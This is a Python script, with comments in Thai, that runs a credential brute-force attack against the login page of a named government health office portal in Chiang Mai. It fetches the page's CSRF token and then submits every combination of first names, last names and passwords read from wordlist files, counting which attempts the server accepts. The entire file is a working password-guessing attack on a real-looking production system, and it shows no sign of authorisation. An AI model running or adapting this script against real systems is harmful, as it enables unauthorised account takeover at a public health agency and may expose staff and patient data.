import requests
from bs4 import BeautifulSoup

# 1. กำหนด URL
base_url = "https://smartoffice.chiangmaihealth.go.th"
login_url = f"{base_url}/login"

# 2. เริ่ม session เพื่อเก็บ cookies
session = requests.Session()

# 3. โหลดหน้า login เพื่อนำ CSRF Token
response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')

# 4. ดึง CSRF Token จาก input hidden
csrf_token = soup.find('input', {'name': '__RequestVerificationToken'})['value']
print(f"CSRF Token ที่ได้: {csrf_token}")

# 5. อ่านข้อมูลจากไฟล์
def read_file_lines(filename):
    """อ่านข้อมูลจากไฟล์และคืนค่าเป็น list"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"❌ ไม่พบไฟล์ {filename}")
        return []

# อ่านข้อมูลจากไฟล์
fnames = read_file_lines('fname.txt')
lnames = read_file_lines('lname.txt')
passwords = read_file_lines('password.txt')

if not fnames or not lnames or not passwords:
    print("❌ ไม่สามารถอ่านข้อมูลจากไฟล์ได้")
    exit()

print(f"📊 ข้อมูลที่โหลดได้:")
print(f"   - ชื่อ: {len(fnames)} รายการ")
print(f"   - นามสกุล: {len(lnames)} รายการ") 
print(f"   - รหัสผ่าน: {len(passwords)} รายการ")
print(f"   - รวมการทดสอบ: {len(fnames) * len(lnames) * len(passwords)} รายการ")
print("-" * 50)

# 6. วนลูปทดสอบข้อมูลจากไฟล์
attempt_count = 0
success_count = 0

for fname in fnames:
    for lname in lnames:
        for password in passwords:
            attempt_count += 1
            
            print(f"\n🔍 ทดสอบครั้งที่ {attempt_count}: {fname} {lname} / {password}")
            
            # เตรียมข้อมูลสำหรับ POST
            login_data = {
                '__RequestVerificationToken': csrf_token,
                'fname': fname,
                'lname': lname,
                'password': password
            }
            
            # ส่ง POST ไปยังฟอร์ม login
            post_response = session.post(login_url, data=login_data)
            
            # ตรวจสอบผลลัพธ์
            if post_response.text.strip().lower() == "true":
                print("✅ Login สำเร็จ (ระบบตอบ true)")
                success_count += 1
            else:
                print("❌ Login ล้มเหลว (ระบบตอบ false)")
            
            print("-" * 30)

# 7. สรุปผลลัพธ์
print("\n" + "=" * 50)
print("📈 สรุปผลการทดสอบ:")
print(f"   - จำนวนครั้งที่ทดสอบ: {attempt_count}")
print(f"   - จำนวนครั้งที่สำเร็จ: {success_count}")
print(f"   - จำนวนครั้งที่ล้มเหลว: {attempt_count - success_count}")
print("=" * 50)
print("🎯 การทดสอบเสร็จสิ้น!")